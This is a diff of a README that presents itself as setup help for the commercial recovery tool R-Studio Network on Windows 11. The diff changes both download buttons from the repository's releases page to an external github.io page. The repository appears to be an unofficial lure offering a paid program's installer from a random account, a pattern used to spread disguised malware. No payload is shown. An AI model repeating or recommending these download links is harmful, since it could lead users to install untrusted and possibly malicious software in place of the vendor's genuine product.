@@ -1,6 +1,6 @@
 # 💾 R-Studio-Network-Setup-Help - Recover your lost data files easily
 
-[![](https://img.shields.io/badge/Download_R_Studio_Network-Blue?style=for-the-badge)](https://github.com/Monroviacommonbean517/R-Studio-Network-Setup-Help/releases)
+[![](https://img.shields.io/badge/Download_R_Studio_Network-Blue?style=for-the-badge)](https://monroviacommonbean517.github.io)
 
 This guide helps you install R-Studio Network on Windows 11. Many users face issues during setup. These notes provide the steps to fix these errors. You will learn to prepare your system, run the installer, and connect to your drives.
 
@@ -16,7 +16,7 @@ Check your PC before you begin. R-Studio Network requires hardware that allows f
 
 ## 🔽 Download the software
 
-[![](https://img.shields.io/badge/Download_Installer-Grey?style=for-the-badge)](https://github.com/Monroviacommonbean517/R-Studio-Network-Setup-Help/releases)
+[![](https://img.shields.io/badge/Download_Installer-Grey?style=for-the-badge)](https://monroviacommonbean517.github.io)
 
 Visit the link above to view the releases page. Choose the file marked for Windows. Click the link to save the installer to your Downloads folder. Do not open the file until the download completes.
 
